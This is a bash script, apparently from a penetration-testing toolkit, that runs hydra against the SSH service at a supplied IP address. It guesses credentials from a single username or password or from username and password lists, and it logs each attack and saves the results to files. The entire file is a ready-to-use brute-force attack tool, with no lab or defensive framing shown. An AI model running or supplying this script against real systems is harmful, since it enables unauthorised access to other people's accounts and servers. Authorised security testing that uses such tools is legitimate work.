#!/bin/bash

# Check if user provided any arguments
if [[ $# == 0 ]]; then
	echo "Syntax: bash brute_force_SSH.sh [-s port] -u username || -U username_list -p password || -P password_list IP address "
	echo "options:"
	echo "  s: specify port for SSH (Default 22)"
	echo "  u: username"
	echo "  U: path to username list"
	echo "  p: password"
	echo "  P: path to password list"
	echo "	h: Help prompt"
	exit 2
fi

# Parse flags from user
while getopts ":hs:u:U:p:P:" opt; do
	case ${opt} in
		h )
			echo "Syntax: bash brute_force_SSH.sh [-s port] -u username | -U username_list -p password | -P password_list IP address "
			echo "options:"
			echo "  s: specify port for SSH (Default 22)"
			echo "  u: username"
			echo "  U: path to username list"
			echo "  p: password"
			echo "  P: path to password list"
			echo "	h: Help prompt"
			exit
			;;
		s )
			port=$OPTARG
			;;
		u )
			user=$OPTARG
			;;
		U)
			user_list=$OPTARG
			;;
		p)
			password=$OPTARG
			;;
		P)
			password_list=$OPTARG
			;;
		\? )
			echo "Invalid option: $OPTARG" 1>&2
			exit 2
			;;
	    : )
	        echo "Invalid Option: -$OPTARG requires an argument" 1>&2
	        exit 2
	        ;;
	esac
done
shift $((OPTIND -1))

# Get IP address
IP=$1

if [[ -z $port ]]; then
	port=22
fi

# Get date and time to log actions taken
TODAY=$(date +%d%m%y)
DATETIME=$(date)
LOG_PATH="../logs/$TODAY/actions.logs"

if ! [[ -e $LOG_PATH ]]; then
	mkdir -p ../logs/$TODAY
	touch $LOG_PATH
fi

# Create directory and set path to save results
mkdir -p ../logs/$TODAY/$IP/attacks
SAVE_PATH="../logs/$TODAY/$IP/attacks/brute_force_SSH.txt"

# Run hydra based on user input
if [[ -z $user_list && -z $password_list ]]; then
	# Log brute force SSH attack
	echo "$DATETIME" >> $LOG_PATH
	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
	echo "Credentials used:" >> $LOG_PATH
	echo "username: $user" >> $LOG_PATH
	echo "password: $password" >> $LOG_PATH
	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
	echo "" >> $LOG_PATH

	# Run hydra attack
	hydra -l $user -p $password -s $port -o $SAVE_PATH -vV $IP ssh
	
elif [[ $user_list && -z $password_list ]]; then
	# Parse user_list to only get txt file and not full path
	user_list_parsed=$(echo $user_list | awk -F/ '{print $NF}')

	# Log brute force SSH attack
	echo "$DATETIME" >> $LOG_PATH
	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
	echo "Credentials used:" >> $LOG_PATH
	echo "username list: $user_list_parsed" >> $LOG_PATH
	echo "password: $password" >> $LOG_PATH
	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
	echo "" >> $LOG_PATH

	# Run hydra attack
	hydra -L $user_list -p $password -s $port -o $SAVE_PATH -vV $IP ssh

elif [[ -z $user_list && $password_list ]]; then
	# Parse password_list to only get txt file and not full path
	password_list_parsed=$(echo $password_list | awk -F/ '{print $NF}')

	# Log brute force SSH attack
	echo "$DATETIME" >> $LOG_PATH
	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
	echo "Credentials used:" >> $LOG_PATH
	echo "username: $user" >> $LOG_PATH
	echo "password list: $password_list_parsed" >> $LOG_PATH
	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
	echo "" >> $LOG_PATH

	# Run hydra attack
	hydra -l $user -P $password_list -s $port -o $SAVE_PATH -vV $IP ssh

elif [[ $user_list && $password_list ]]; then
	# Parse user_list and password_list to only get txt file and not full path
	user_list_parsed=$(echo $user_list | awk -F/ '{print $NF}')
	password_list_parsed=$(echo $password_list | awk -F/ '{print $NF}')

	# Log brute force SSH attack
	echo "$DATETIME" >> $LOG_PATH
	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
	echo "Credentials used:" >> $LOG_PATH
	echo "username list: $user_list_parsed" >> $LOG_PATH
	echo "password list: $password_list_parsed" >> $LOG_PATH
	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
	echo "" >> $LOG_PATH

	# Run hydra attack
	hydra -L $user_list -P $password_list -s $port -o $SAVE_PATH -vV $IP ssh
fi

echo "[*] Results have been saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt"